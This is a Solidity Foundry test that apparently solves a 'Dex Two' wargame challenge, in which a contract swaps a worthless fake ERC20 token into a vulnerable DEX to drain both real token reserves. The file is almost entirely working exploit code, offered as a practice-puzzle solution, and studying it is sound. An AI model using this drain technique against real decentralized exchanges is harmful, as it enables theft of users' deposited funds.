// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Test.sol";
import {DexTwo, SwappableTokenTwo} from "../DexTwo.sol";
import {FakeERC20} from "../FakeERC20.sol";

contract ContractTest is Test {
    DexTwo dex;
    SwappableTokenTwo token0;
    SwappableTokenTwo token1;
    FakeERC20 fake;

    function test_challenge_23() public {
        console.log("Challenge #23");

        dex = new DexTwo();

        token0 = new SwappableTokenTwo(address(dex), "ABC", "ABC", 1000);
        token1 = new SwappableTokenTwo(address(dex), "XYZ", "XYZ", 1000);
        fake = new FakeERC20();

        dex.setTokens(address(token0), address(token1));
        dex.approve(address(dex), 100);
        dex.add_liquidity(address(token0), 100);
        dex.add_liquidity(address(token1), 100);

        token0.transfer(address(1337), 10);
        token1.transfer(address(1337), 10);

        console.log("");
        console.log("dex token0 balance", token0.balanceOf(address(dex)));
        console.log("dex token1 balance", token1.balanceOf(address(dex)));

        console.log("");
        console.log("1337 token0 balance", token0.balanceOf(address(1337)));
        console.log("1337 token0 balance", token1.balanceOf(address(1337)));

        vm.startPrank(address(1337));

        dex.approve(address(dex), 1000);
        dex.swap(address(fake), address(token0), 1);
        console.log("");
        logSwapPrice();
        dex.swap(address(fake), address(token1), 1);
        logSwapPrice();

        vm.stopPrank();

        console.log("Token0 drained from dex!");
        console.log("Token1 drained from dex!");
    }

    function logSwapPrice() public {
        console.log("-------------- SWAP -----------------");
        console.log("1337 token0 balance", token0.balanceOf(address(1337)));
        console.log("1337 token1 balance", token1.balanceOf(address(1337)));
        console.log("dex  token0 balance", token0.balanceOf(address(dex)));
        console.log("dex  token1 balance", token1.balanceOf(address(dex)));
        console.log("");
    }
}
